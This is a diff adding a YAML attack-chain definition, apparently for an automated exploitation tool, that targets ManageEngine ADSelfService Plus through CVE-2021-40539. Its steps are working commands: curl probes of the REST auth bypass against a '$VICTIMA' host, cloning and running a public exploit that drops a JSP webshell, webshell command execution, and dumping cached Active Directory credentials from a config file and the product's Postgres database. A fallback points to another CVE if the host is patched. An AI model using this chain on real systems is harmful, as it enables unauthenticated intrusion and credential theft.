@@ -1,0 +1,63 @@
+chain_id: manageengine_adss_cve_2021_40539
+title: "ManageEngine ADSelfService Plus — CVE-2021-40539 REST auth bypass → unauth RCE"
+severity: CRITICAL
+tags: [web, manageengine, adss, cve-2021-40539, auth-bypass, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-40539" }
+    - { banner_pattern: "(?i)manageengine|adselfservice|zoho" }
+    - { product_pattern: "(?i)manageengine\\s*adselfservice\\s*plus" }
+    - { path_pattern: "(?i)/RestAPI/(LogonCustomization|Connection)" }
+    - { port_in: [9251, 8888] }
+
+description: |
+  ADSelfService Plus ≤ 6113 routes `/RestAPI/...` requests through a
+  filter that is bypassed by trailing path segments, letting an unauth
+  POST hit `LogonCustomization`/`Connection` endpoints. Those endpoints
+  deserialize attacker-controlled data into a Java payload that writes
+  a JSP webshell into the webapp. APT exploitation flagged by CISA &
+  FBI in Sep-2021.
+
+steps:
+  - id: 1
+    title: "Fingerprint the build"
+    command: |
+      curl -sk "https://$VICTIMA:9251/" -I
+      curl -sk "https://$VICTIMA:9251/help/admin-guide/Reference/build.html" -I
+
+  - id: 2
+    title: "Probe the bypass — 200 means vulnerable"
+    command: |
+      curl -sk -i "https://$VICTIMA:9251/./RestAPI/LogonCustomization" \
+        -d 'methodToCall=previewMobLogo&Save=Save'
+
+  - id: 3
+    title: "Public PoC drops a JSP webshell at /help/admin-guide/RestAPI/<file>.jsp"
+    command: |
+      git clone https://github.com/synacktiv/CVE-2021-40539 /tmp/adss
+      python3 /tmp/adss/exploit.py --target https://$VICTIMA:9251 \
+        --command 'cmd /c whoami'
+
+  - id: 4
+    title: "Use the dropped webshell"
+    command: |
+      curl -sk "https://$VICTIMA:9251/help/admin-guide/RestAPI/shell.jsp?cmd=whoami"
+
+  - id: 5
+    title: "Post: dump AD creds the product caches"
+    command: |
+      # On the host:
+      type "C:\\ManageEngine\\ADSelfService Plus\\bin\\properties.json"
+      # Or query the embedded Postgres:
+      psql -h 127.0.0.1 -p 33306 -U postgres -d adsm -c 'select * from adsmcred;'
+
+common_errors:
+  - error: "/RestAPI/LogonCustomization returns 401"
+    solution: |
+      Patched (≥6114). Verify build via `/configuredApps`. If patched,
+      try CVE-2022-47966 (SAML SSO XSLT injection) on the same product.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-40539
+  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-259a
